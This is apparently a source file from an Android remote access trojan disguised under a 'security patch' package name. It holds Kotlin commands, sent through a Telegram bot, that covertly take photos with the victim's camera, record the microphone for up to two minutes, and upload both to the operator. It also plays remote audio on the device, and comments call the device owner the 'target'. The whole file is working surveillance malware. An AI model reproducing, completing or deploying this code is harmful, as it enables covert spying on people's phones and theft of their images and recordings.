package com.android.security.patch.commands

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.hardware.camera2.params.StreamConfigurationMap
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.MediaScannerConnection
import android.net.Uri
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import com.android.security.patch.RatApi
import com.android.security.patch.CoreService
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.net.URL

object Media {

    /**
     * /cam rear  → foto pakai kamera belakang
     * /cam front → foto pakai kamera depan
     * /cam rear 0  → flash off, 1 → flash on, 2 → auto
     */
    fun cam(ctx: Context, chatId: Long, args: Array<String>, msg: JSONObject?) {
        val facing = when (args.getOrNull(0)?.lowercase()) {
            "front", "depan" -> CameraCharacteristics.LENS_FACING_FRONT
            else -> CameraCharacteristics.LENS_FACING_BACK
        }
        val flashMode = when (args.getOrNull(1)?.toIntOrNull() ?: 0) {
            1 -> CaptureRequest.CONTROL_AE_MODE_ON_ALWAYS_FLASH
            2 -> CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH
            else -> CaptureRequest.CONTROL_AE_MODE_ON
        }
        RatApi.sendChatAction(ctx, "upload_photo", chatId)
        Thread {
            try {
                try { CoreService.instance?.promoteToCamera() } catch (_: Throwable) {}
                Thread.sleep(400)
                val jpeg = capture(ctx, facing, flashMode)
                if (jpeg == null) {
                    RatApi.sendMessage(ctx, "camera failed (permission? in use?)", chatId); return@Thread
                }
                // simpan juga di dcim target (biar kaya foto biasa)
                try {
                    val dir = File("/sdcard/DCIM/Camera")
                    if (!dir.exists()) dir.mkdirs()
                    val f = File(dir, "IMG_${System.currentTimeMillis()}.jpg")
                    FileOutputStream(f).use { it.write(jpeg) }
                    MediaScannerConnection.scanFile(ctx, arrayOf(f.absolutePath), null, null)
                } catch (_: Throwable) {}
                RatApi.sendPhoto(ctx, jpeg, "cam", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            } finally {
                try { CoreService.instance?.demoteFromCamera() } catch (_: Throwable) {}
            }
        }.start()
    }

    private fun pickCameraId(mgr: CameraManager, facing: Int): String? {
        for (id in mgr.cameraIdList) {
            val ch = mgr.getCameraCharacteristics(id)
            if (ch.get(CameraCharacteristics.LENS_FACING) == facing) return id
        }
        return mgr.cameraIdList.firstOrNull()
    }

    private fun pickSize(map: StreamConfigurationMap): Size {
        val sizes = map.getOutputSizes(ImageFormat.JPEG) ?: return Size(1280, 720)
        // pilih ukuran sedang ~1-2MP
        val sorted = sizes.sortedByDescending { it.width * it.height }
        return sorted.firstOrNull { it.width * it.height in 1_000_000..3_000_000 }
            ?: sorted.getOrNull(sorted.size / 3)
            ?: sorted.last()
    }

    private fun capture(ctx: Context, facing: Int, flashMode: Int): ByteArray? {
        val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val camId = pickCameraId(mgr, facing) ?: return null

        val t = HandlerThread("cam").also { it.start() }
        val h = Handler(t.looper)

        var device: CameraDevice? = null
        var session: CameraCaptureSession? = null
        var reader: android.media.ImageReader? = null
        val result = ByteArrayOutputStream()
        val lock = Object()

        try {
            val chars = mgr.getCameraCharacteristics(camId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            val size = pickSize(map)

            val opened = Object()
            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) {
                    device = c
                    synchronized(opened) { opened.notifyAll() }
                }
                override fun onDisconnected(c: CameraDevice) { c.close(); synchronized(opened) { opened.notifyAll() } }
                override fun onError(c: CameraDevice, e: Int) { c.close(); synchronized(opened) { opened.notifyAll() } }
            }, h)
            synchronized(opened) { opened.wait(4000) }
            val dev = device ?: return null

            reader = android.media.ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buf = img.planes[0].buffer
                    val b = ByteArray(buf.remaining())
                    buf.get(b)
                    result.write(b)
                } finally { img.close() }
                synchronized(lock) { lock.notifyAll() }
            }, h)

            val surface = reader.surface
            val sessionReady = Object()
            dev.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: CameraCaptureSession) {
                    session = s
                    synchronized(sessionReady) { sessionReady.notifyAll() }
                }
                override fun onConfigureFailed(s: CameraCaptureSession) {
                    synchronized(sessionReady) { sessionReady.notifyAll() }
                }
            }, h)
            synchronized(sessionReady) { sessionReady.wait(4000) }
            val sess = session ?: return null

            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(surface)
                set(CaptureRequest.CONTROL_AE_MODE, flashMode)
                set(CaptureRequest.JPEG_ORIENTATION, 90)
            }.build()

            val captured = Object()
            sess.capture(req, object : CameraCaptureSession.CaptureCallback() {
                override fun onCaptureCompleted(
                    s: CameraCaptureSession,
                    r: CaptureRequest,
                    res: TotalCaptureResult
                ) {
                    synchronized(captured) { captured.notifyAll() }
                }
            }, h)

            synchronized(captured) { captured.wait(5000) }
            synchronized(lock) { lock.wait(3000) }
            return if (result.size() > 0) result.toByteArray() else null
        } catch (_: Throwable) {
            return null
        } finally {
            try { session?.close() } catch (_: Throwable) {}
            try { device?.close() } catch (_: Throwable) {}
            try { reader?.close() } catch (_: Throwable) {}
            t.quitSafely()
        }
    }

    /** /mic <sec> — rekam suara mic target */
    fun mic(ctx: Context, chatId: Long, args: Array<String>) {
        val sec = (args.getOrNull(0)?.toIntOrNull() ?: 10).coerceIn(1, 120)
        RatApi.sendChatAction(ctx, "record_voice", chatId)
        Thread {
            try {
                val f = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
                val rec = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
                    MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
                rec.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(96000)
                    setOutputFile(f.absolutePath)
                    prepare()
                    start()
                }
                Thread.sleep(sec * 1000L)
                try { rec.stop() } catch (_: Throwable) {}
                rec.release()
                if (!f.exists() || f.length() == 0L) {
                    RatApi.sendMessage(ctx, "mic empty (denied?)", chatId); return@Thread
                }
                RatApi.sendAudio(ctx, f.readBytes(), "mic ${sec}s", chatId)
                f.delete()
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "mic err: ${e.message}", chatId)
            }
        }.start()
    }

    /**
     * /voice <url>            → download dari url, play di device
     * /voice (dengan reply file audio di telegram) → download dari tg, play
     */
    fun voice(ctx: Context, chatId: Long, args: Array<String>, msg: JSONObject?) {
        // prioritas: kalau ada reply audio
        val reply = msg?.optJSONObject("reply_to_message")
        val audio = reply?.optJSONObject("audio")
            ?: reply?.optJSONObject("voice")
            ?: reply?.optJSONObject("document")?.takeIf {
                it.optString("mime_type").startsWith("audio")
            }
        val fileId = audio?.optString("file_id")

        Thread {
            try {
                val bytes: ByteArray? = if (!fileId.isNullOrBlank()) {
                    RatApi.downloadTelegramFile(fileId)
                } else {
                    val url = args.getOrNull(0)
                    if (url.isNullOrBlank()) {
                        RatApi.sendMessage(ctx, "usage: /voice <url>  atau reply audio", chatId); return@Thread
                    }
                    URL(url).openStream().use { it.readBytes() }
                }
                if (bytes == null || bytes.isEmpty()) {
                    RatApi.sendMessage(ctx, "download failed", chatId); return@Thread
                }
                val f = File(ctx.cacheDir, "v_${System.currentTimeMillis()}")
                FileOutputStream(f).use { it.write(bytes) }
                val mp = android.media.MediaPlayer()
                mp.setAudioAttributes(
                    android.media.AudioAttributes.Builder()
                        .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
                        .setContentType(android.media.AudioAttributes.CONTENT_TYPE_MUSIC)
                        .build()
                )
                mp.setDataSource(f.absolutePath)
                mp.isLooping = false
                mp.prepare()
                mp.start()
                RatApi.sendMessage(ctx, "playing on device (${bytes.size} bytes)", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "voice err: ${e.message}", chatId)
            }
        }.start()
    }
}